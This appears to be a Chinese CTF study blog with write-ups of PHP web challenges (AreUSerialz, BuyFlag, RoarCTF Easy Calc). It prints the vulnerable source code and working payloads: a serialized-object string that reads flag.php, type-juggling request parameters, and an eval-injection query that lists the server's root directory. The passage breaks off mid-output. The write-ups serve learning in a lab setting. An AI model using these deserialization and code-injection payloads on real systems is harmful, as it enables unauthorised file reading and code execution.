<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$key</span>)) &#123;  <span class="hljs-comment">//检查字符串是否只以数字构成，就是只能上传数字</span><br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-variable">$str</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="弱比较-强比较"><a href="#弱比较-强比较" class="headerlink" title="弱比较 强比较"></a>弱比较 强比较</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">在进行比较的时候 会先将两种参数类型转化成相同<br><br>如果为整型跟字符型比较 那么字符将从左往右提取整型直到遇到字符结束 再比较。<br><br>若字符型为数字中间包含了一个e或E 则e或E会被科学计数法的标记<br><br>而数字中间包含了一个. 也会被看作为小数点<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_51196842/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">120591289</span><br><br></code></pre></td></tr></table></figure>
<p>然后上网查intval函数绕过<br>intval函数在处理字符串时以数字开头遇到第一个字母时会停止。</p>
<p>大概就是弱比较会将不同数据类型，然后$key被转化类型会变成 123，<br>然后get传 123 进index即可</p>
<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>直接拿到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
<p>反序列化题，有点复杂,给deepseek看:</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs llvm">要获取flag，需要通过反序列化漏洞触发FileHandler类的read方法读取flag.php。步骤如下：<br><br>构造恶意对象：创建一个FileHandler对象，设置op为整数<span class="hljs-number">2</span>（绕过析构函数的修改），filename为flag.php。<br><br>处理序列化字符串：由于<span class="hljs-keyword">protected</span>属性在序列化中包含空字符，需使用大写S和十六进制转义绕过字符检查。<br><br>URL编码：确保特殊字符正确传输。<br><br>***<br>op为整数<span class="hljs-number">2</span>：绕过析构函数中的严格比较，触发read方法。<br><br>转义空字符：使用\<span class="hljs-number">00</span>表示空字符，通过is_valid检查。<br><br>读取flag.php：在析构时调用process，op仍为<span class="hljs-number">2</span>，读取flag.php内容输出。<br><br>它直接给出了payload<span class="hljs-operator">=</span><br>?str<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>FileHandler<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>C<span class="hljs-number">00</span><span class="hljs-variable">%5</span>C<span class="hljs-number">2</span>A<span class="hljs-variable">%5</span>C<span class="hljs-number">00</span>op<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bi<span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>C<span class="hljs-number">00</span><span class="hljs-variable">%5</span>C<span class="hljs-number">2</span>A<span class="hljs-variable">%5</span>C<span class="hljs-number">00</span>filename<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>flag.php<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">10</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>C<span class="hljs-number">00</span><span class="hljs-variable">%5</span>C<span class="hljs-number">2</span>A<span class="hljs-variable">%5</span>C<span class="hljs-number">00</span>content<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br><br>直接传入后F<span class="hljs-number">12</span>得到了flag！！？<br></code></pre></td></tr></table></figure>
<p>自己来试试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>(<span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>,<span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br>O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;\00*\00op&quot;</span>;N;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;\00*\00filename&quot;</span>;N;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;\00*\00content&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure>
<p>还是没搞懂，去找wp吧</p>
<p>出来的一直是这玩意：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure>
<p>算了直接改吧<br>O:11:”FileHandler”:3:{s:2:”op”;2;s:8:”filename”;’flag.php’;s:7:”content”;N;}<br>不行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>;<br><span class="hljs-comment">// $a=new FileHandler($op=&quot;2&quot;,$filename=&quot;flag.php&quot;);</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
<p>行了</p>
<h2 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h2><p>第一步：____destruct:  绕过 &#x3D;&#x3D;&#x3D; “2”，因为这里是强等字符串2于，直接传入数值2会让它不等于，而不会被置为1；<br>第二步：is_valid(),题目里定义了这个函数来判断输入的字符是否未ascii码里的字符，若有在ascii码里的字符就会失败，这里网上就出现了两种绕过，<br>第一种：因为题目里用的是protected类型的变量，要从url传入的话会多出不ascii里的字符，所以想办法将payload里的不不合要求字符替换。<br>第二种：利用php 7.1+版本对类的属性不敏感，直接传入public类，就不会有不和要求字符<br>具体看：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46246804/article/details/108746253">https://blog.csdn.net/m0_46246804/article/details/108746253</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73734159/article/details/134648981">https://blog.csdn.net/m0_73734159/article/details/134648981</a></p>
<p>第二步：到了这里因为传入了2，所以到了read()函数，会有file_get_contents()函数来指定文件来下一步，直接使得filename&#x3D;”flag.php”即可</p>
<p>最后记得F12查看，因为程序里不会echo flag 而是 return flag！！！！！<br>wp里是用file_get_contents()的伪协议来直接输出base64编码后的flag</p>
<h2 id="notice-3"><a href="#notice-3" class="headerlink" title="notice"></a>notice</h2><p>is_valid()函数对传入的字符串进行判断，确保每一个字符ASCII码值都在32-125，即该函数的作用是确保参数字符串的每一个字符都是可打印的，才返回true。  </p>
<p>public无标记，变量名不变。 s:2:“op”;i:2;<br>protected在变量名前添加标记\00*\00。 s:5:“\00*\00op”;i:2;<br>private在变量名前添加标记\00类名\00。s:17:“\00类名\00op”;i:2;<br>序列化后protected类型的属性存在不可打印字符。（private类型的属性序列化后也产生不可打印字符）;<br>PHP版本7.1+，对属性的类型不敏感;</p>
<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>感觉我心还是太急了，没发现cooki，没试一下用bp抓包，就上网找wp了，明明是很标准的流程，，，，，<br>一开始发现要post上传password，但是没发先有cookie一直回显要求的账户，把cookie改为1即可，<br>然后到密码，试了“404”，不行。看wp，用php弱比较，上传404a，显示能过不是纯数值这关，然后到弱比较，如果比较的变量开头是数字，会把数字截取到遇到字符为止，所以404a会变成404。<br>然后到了money，试了了一下，不能传太长的数值，所以用科学计数法传了9亿，拿到flag </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">POST /<br><span class="hljs-attribute">cookie</span>=1<br><br><span class="hljs-attribute">password</span>=404aa&amp;money=9e8<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="title-note-31date-2025-04-27-20-24-35tags-web"><a href="#title-note-31date-2025-04-27-20-24-35tags-web" class="headerlink" title="title: note-31date: 2025-04-27 20:24:35tags: web"></a>title: note-31<br>date: 2025-04-27 20:24:35<br>tags: web</h2><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>进去后是个页面，输入计算式，计算结果，没见过类似的题目啊,f12，发现有个calu.php,访问得到源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">//关闭错误报告</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-comment">//如果num未被设置则显示源码</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>然后看别人的wp做<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/vanarrow/article/details/107976892">https://blog.csdn.net/vanarrow/article/details/107976892</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/echoDetected/p/13091486.html">https://www.cnblogs.com/echoDetected/p/13091486.html</a>  </p>
<p>当传入：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> num<br><span class="hljs-comment">//就能绕过正则匹配？</span><br><span class="hljs-comment">//此时的&quot;nmu&quot;不等于&quot; num&quot;,绕过了：</span><br><br><span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br><br><span class="hljs-comment">//但是在eval里解析的时候会把空格移除，这样就能实现绕过</span><br></code></pre></td></tr></table></figure>
<p>在本地试了一下，确实是这样:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo&#x27;</span>. <span class="hljs-title function_ invoke__">phpinfo</span>().<span class="hljs-string">&#x27;;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo&#x27;</span>.<span class="hljs-string">&#x27; phpinfo()&#x27;</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>接下来总结别人的wp：<br>1.用” num”来绕过正则匹配；<br>2.var_dump函数来输出回显，用file_get_contents()来加载flag文件chr()函数来绕过非法字符；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">s=<span class="hljs-string">&#x27;&#x27;</span><br>s=s+<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;enter you str,then i will give you them ascii:\n&quot;</span>)<br>o=<span class="hljs-number">0</span> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>    o=<span class="hljs-built_in">ord</span>(i)<br>    <span class="hljs-built_in">print</span>(o)<br></code></pre></td></tr></table></figure>
<p>然后到做题：<br>查看根目录：</p>
<figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sml">/calc.php? num=var_dump(scandir(chr(<span class="hljs-number">47</span>)))<br><br>回显：<br><span class="hljs-built_in">array</span>(<span class="hljs-number">24</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">10</span>) <span class="hljs-string">&quot;.dockerenv&quot;</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;bin&quot;</span> [<span class="hljs-number">4</span>]=&gt; <span class="hljs-built_in">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;boot&quot;</span> [<span class="hljs-number">5</span>]=&gt; <span 